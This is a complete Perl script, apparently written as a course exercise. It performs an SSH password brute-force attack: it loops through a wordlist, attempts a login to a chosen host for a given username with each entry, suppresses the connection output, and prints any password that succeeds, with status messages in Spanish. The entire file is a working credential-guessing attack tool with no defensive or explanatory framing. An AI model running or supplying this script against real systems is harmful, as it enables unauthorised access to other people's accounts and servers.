#!/usr/bin/perl
# usage: perl p8_jmartinez.pl username password_list.txt 127.0.0.1

use Net::OpenSSH;

my $username = @ARGV[0];
my $password_list = @ARGV[1];
my $host = @ARGV[2];
my $ssh;



if ($#ARGV != 2) {
    print "\nUsage: ./p8_jmartinez.pl username password_list.txt 127.0.0.1\n";
    exit;
}

open(WORDLIST, "$password_list")
        or die "[!] Failed to open: $password_list";

@wordlist=<WORDLIST>;

foreach $password (@wordlist)
{

        chomp($passwod);
        print "\n[*]Trying $password";
       
        if ( ssh($password) == 1){
            print "==========================\n\nPASSWORD encontrado!\n";
            print "  user:$username\n";
            print "  password:$password\n";
            last;
        } else {
            print "  [!]password no válido :c\n";
        }
}

sub ssh {
    my($pass) = @_;
    chomp($pass);

    open(my $stderr_fh,'>>/dev/null') || die $!;
    open(my $stdout_fh,'>>/dev/null') || die $!;

    my %opts = (
        user => $username,
        passwd => $pass,
        default_stderr_fh => $stderr_fh,
        default_stdout_fh => $stdout_fh,
        timeout => 20,
    );

    my $ssh = Net::OpenSSH->new($host,%opts);

    if($ssh->error){
        # password NO encontrado
        return 0;
    } else {
        # password encontrado
        return 1;
    }
}